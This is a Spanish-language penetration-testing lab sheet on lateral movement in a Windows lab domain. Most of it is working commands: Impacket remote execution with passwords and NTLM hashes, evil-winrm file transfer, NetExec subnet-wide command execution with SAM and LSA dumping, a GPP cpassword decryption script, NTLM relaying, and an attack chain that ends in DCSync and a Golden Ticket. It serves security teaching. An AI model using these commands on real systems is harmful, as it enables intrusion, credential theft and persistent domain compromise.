# Lab 06 — Lateral Movement

## Objetivo

Moverse lateralmente por el dominio desde una cuenta comprometida: ejecución remota de comandos, acceso a recursos y escalada hacia otros sistemas.

---

## Parte 1 — Ejecución remota con Impacket

### psexec — shell interactiva via SCM

```bash
# Con contraseña
psexec.py labthinktank.local/Administrator:Lab@Think2026!@192.168.100.10

# Con hash NTLM
psexec.py -hashes :2b576acbe6bcfda7294d6bd18041b8fe \
    labthinktank.local/Administrator@192.168.100.10

# Ejecutar un comando específico
psexec.py labthinktank.local/Administrator:Lab@Think2026!@192.168.100.10 \
    "ipconfig /all"
```

### wmiexec — via WMI (más sigiloso)

```bash
# WMI no crea un servicio en el sistema remoto
wmiexec.py labthinktank.local/Administrator:Lab@Think2026!@192.168.100.10

# Con hash
wmiexec.py -hashes :2b576acbe6bcfda7294d6bd18041b8fe \
    labthinktank.local/Administrator@192.168.100.10

# Modo sin output interactivo (muy silencioso)
wmiexec.py labthinktank.local/Administrator:Lab@Think2026!@192.168.100.10 \
    -nooutput "cmd /c whoami > C:\temp\out.txt"
```

### smbexec — via SMB shares

```bash
smbexec.py labthinktank.local/Administrator:Lab@Think2026!@192.168.100.10
```

### dcomexec — via DCOM

```bash
dcomexec.py labthinktank.local/Administrator:Lab@Think2026!@192.168.100.10
```

---

## Parte 2 — Evil-WinRM (PowerShell Remoting)

```bash
# Requiere WinRM habilitado (puerto 5985)
evil-winrm -i 192.168.100.10 \
    -u Administrator \
    -p "Lab@Think2026!"

# Con hash NTLM
evil-winrm -i 192.168.100.10 \
    -u Administrator \
    -H 2b576acbe6bcfda7294d6bd18041b8fe

# Subir/descargar archivos desde Evil-WinRM
*Evil-WinRM* PS> upload /ruta/local/archivo.exe C:\Windows\Temp\
*Evil-WinRM* PS> download C:\ruta\secreto.txt /workspace/
```

---

## Parte 3 — NetExec para movimiento lateral masivo

```bash
# Verificar acceso en toda la subred
nxc smb 192.168.100.0/24 \
    -u Administrator \
    -H 2b576acbe6bcfda7294d6bd18041b8fe \
    --continue-on-success

# (Pwn3d!) = local admin
# Output:
# SMB  192.168.100.10  445  DC01  [+] LABTHINKTANK\Administrator (Pwn3d!)

# Ejecutar comando en todos los sistemas comprometidos
nxc smb 192.168.100.0/24 \
    -u Administrator \
    -H 2b576acbe6bcfda7294d6bd18041b8fe \
    -x "whoami" \
    --continue-on-success

# Volcar SAM de todos los sistemas
nxc smb 192.168.100.0/24 \
    -u Administrator \
    -H 2b576acbe6bcfda7294d6bd18041b8fe \
    --sam

# Volcar LSA secrets
nxc smb 192.168.100.0/24 \
    -u Administrator \
    -H 2b576acbe6bcfda7294d6bd18041b8fe \
    --lsa
```

---

## Parte 4 — Acceso a shares y archivos

```bash
# Listar shares de un sistema
nxc smb 192.168.100.10 \
    -u jgarcia -p "Password123!" \
    --shares

# Listar contenido de un share
smbclient //192.168.100.10/SYSVOL \
    -U "labthinktank.local\jgarcia%Password123!"

# Descargar todo el contenido de SYSVOL (buscar GPO con contraseñas)
smbclient //192.168.100.10/SYSVOL \
    -U "labthinktank.local\jgarcia%Password123!" \
    -c "recurse ON; prompt OFF; mget *" \
    -m SMB3

# Buscar contraseñas en GPO (Groups.xml — cpassword)
grep -r "cpassword" /workspace/sysvol_dump/

# Descifrar cpassword (AES-256 con clave pública de MS)
python3 -c "
from Crypto.Cipher import AES
import base64
# MS publicó la clave AES para Group Policy Preferences
key = bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
# cpassword base64 del XML
enc = base64.b64decode(b'TU_CPASSWORD_BASE64' + b'=' * (4 - len(b'TU_CPASSWORD_BASE64') % 4))
cipher = AES.new(key, AES.MODE_CBC, iv=b'\x00'*16)
print(cipher.decrypt(enc).decode('utf-16-le', errors='ignore').rstrip('\x00'))
"
```

---

## Parte 5 — Tunneling y pivoting

```bash
# Socks proxy via impacket (acceder a red interna desde atacante externo)
smbserver.py -smb2support share /workspace/

# ntlmrelayx — capturar y reenviar autenticaciones NTLM
ntlmrelayx.py -tf targets.txt \
    -smb2support \
    -socks

# Usar el socks proxy
proxychains nxc smb 192.168.100.10 -u ... -p ...
```

---

## Parte 6 — Ruta completa de ataque del dominio

```
1. Enumeración inicial (sin creds)
   nxc smb 192.168.100.10 --users (null session)
        ↓
2. Password Spray → jgarcia:Password123!
   kerbrute passwordspray ...
        ↓
3. Kerberoasting → sql_svc:sql_service_pass! (Domain Admin)
   GetUserSPNs.py → hashcat
        ↓
4. PtH con hash de sql_svc → shell en DC
   psexec.py / wmiexec.py
        ↓
5. DCSync → todos los hashes
   secretsdump.py
        ↓
6. Golden Ticket → persistencia permanente
   ticketer.py → KRB5CCNAME
```

---

## Actividades

1. Usando las credenciales de `sql_svc`, ejecutar `ipconfig` en el DC con `wmiexec`
2. Con NetExec, verificar en cuántos hosts tiene admin el usuario `Administrator`
3. Volcar los hashes SAM de al menos un sistema con NetExec `--sam`
4. Buscar archivos `Groups.xml` en SYSVOL y verificar si contienen `cpassword`
5. Documentar la ruta completa de compromiso del dominio desde null session hasta DA

---

## Mapeo MITRE ATT&CK

| Técnica | TTP |
|---------|-----|
| Remote Services — SMB/Windows Admin Shares | T1021.002 |
| Remote Services — WMI | T1047 |
| Remote Services — Windows Remote Management | T1021.006 |
| Lateral Tool Transfer | T1570 |
| Group Policy Preferences (GPP Passwords) | T1552.006 |
